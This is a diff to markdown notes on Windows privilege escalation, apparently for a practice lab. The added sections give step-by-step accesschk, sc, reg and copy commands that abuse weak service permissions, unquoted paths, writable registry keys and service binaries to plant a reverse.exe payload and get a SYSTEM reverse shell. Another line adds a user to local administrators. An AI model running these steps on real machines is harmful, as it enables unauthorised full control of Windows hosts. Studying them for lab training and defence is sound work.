@@ -190,20 +190,67 @@
 		- `exploit`
 - More on: https://steflan-security.com/windows-privilege-escalation-alwaysinstallelevated-policy/
 
-**Service Escalation - regsvc**
+**Service Escalation: Insecure Service Permissions**
+- Use accesschk.exe to check the "user" account's permissions on the "daclsvc" service:
+	- `C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc`
+- Note that the "user" account has the permission to change the service config (SERVICE_CHANGE_CONFIG).
+- Query the service and note that it runs with SYSTEM privileges (SERVICE_START_NAME):
+	- `sc qc daclsvc`
+- Modify the service config and set the BINARY_PATH_NAME (binpath) to the reverse.exe executable you created:
+- `sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""`
+- Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
+	- `net start daclsvc`
+	
+**Service Escalation: Unquoted Service Paths**
+- If you have a service executable which path is not enclosed quotations and contains a space, we can escalate a privileges (only if the vulnerable service is running with SYSTEM privilege level which most of the time it is).
+- Query the "unquotedsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME) and that the BINARY_PATH_NAME is unquoted and contains spaces.
+	- `sc qc unquotedsvc`
+- Using accesschk.exe, note that the BUILTIN\Users group is allowed to write to the C:\Program Files\Unquoted Path Service\ directory:
+	- `C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"`
+- Copy the reverse.exe executable you created to this directory and rename it Common.exe:
+	- `copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"`
+- Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
+	- `net start unquotedsvc`
+- Or,
 - Detection
+	- PowerUp
+		- `...\PowerUp.ps1`
+		- `Invoke-AllChecks`
+- Create a malicious exe file and deliver to windows.
+- Name the exe file as the same where the space if found on the service path and mv exe file.
+- Example, if the path is `C:\Program File\Unquoted Path\Common Path\testservice.exe`
+- We should name the malicious payload with Common.exe and move it under Coomon Path directory.
+- Start the service: `sc start unquotedsvc`
+- More Info: https://vk9-sec.com/privilege-escalation-unquoted-service-path-windows/
+- Even More on: https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae
+
+**Service Escalation: Weak Registry Permission**
+- Detection
+	- Query the "regsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).
+		- `sc qc regsvc`
+	- Using accesschk.exe, note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users):
+		- `C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc`
+	- Or,
 	- Open powershell prompt and type: `Get-Acl hklm:\System\CurrentControlSet\services\regsvc | fl`
 	- Notice that the output suggests that user belong to "NT AUTHORITY\INTERACTIVE" has "FullControl" permission over the registry key.
 	- If Authenticated Users or NT AUTHORITY/INTERACTIVE have FullControl in any of the services, in that case, you can change the binary that is going to be executed by the service.
 - Exploitation
 	- Modify the `ImagePath` key of the registry to your payload path and restart the service.
-	- ` reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\Temp\shell.exe /f`
+		- ` reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\Temp\shell.exe /f`
 	- `sc start regsvc`
 - More on: https://infosecwriteups.com/privilege-escalation-in-windows-380bee3a2842
 - Detailed on: https://systemweakness.com/windows-privilege-escalation-weak-registry-permissions-9060c1ca7c10
 
-## Escalation Path: Executable Services
-
+## Service Escalation: Insecure Service Executables
+- Query the "filepermsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).
+	- `sc qc filepermsvc`
+- Using accesschk.exe, note that the service binary (BINARY_PATH_NAME) file is writable by everyone:
+	- `C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"`
+- Copy the reverse.exe executable you created and replace the filepermservice.exe with it:
+	- `copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y`
+- Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
+	- `net start filepermsvc`
+	
 ## Escalation Path: Startup Applications
 - Startup applicatins are similar to autoruns that we perform. When we boot up our machine, an application is going to startup.
 - We will use icacls, it will look at the permissions of ACLs and allow us to see where we might have access.
@@ -283,20 +330,6 @@ BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
   - `sc config daclsvc binpath= "net localgroup administrators user /add`
   - `sc start daclsvc`
   - `net localgroup administrators`
-
-**Escalations via Unquoted Service Paths**
-- If you have a service executable which path is not enclosed quotations and contains a space, we can escalate a privileges (only if the vulnerable service is running with SYSTEM privilege level which most of the time it is).
-- Detection
-	- PowerUp
-		- `...\PowerUp.ps1`
-		- `Invoke-AllChecks`
-- Create a malicious exe file and deliver to windows.
-- Name the exe file as the same where the space if found on the service path and mv exe file.
-- Example, if the path is `C:\Program File\Unquoted Path\Common Path\testservice.exe`
-- We should name the malicious payload with Common.exe and move it under Coomon Path directory.
-- Start the service: `sc start unquotedsvc`
-- More Info: https://vk9-sec.com/privilege-escalation-unquoted-service-path-windows/
-- Even More on: https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae
 
 ## Escalation Path: CVE-2019-1388
 - More Info: https://justinsaechao23.medium.com/cve-2019-1388-windows-certificate-dialog-elevation-of-privilege-4d247df5b4d7
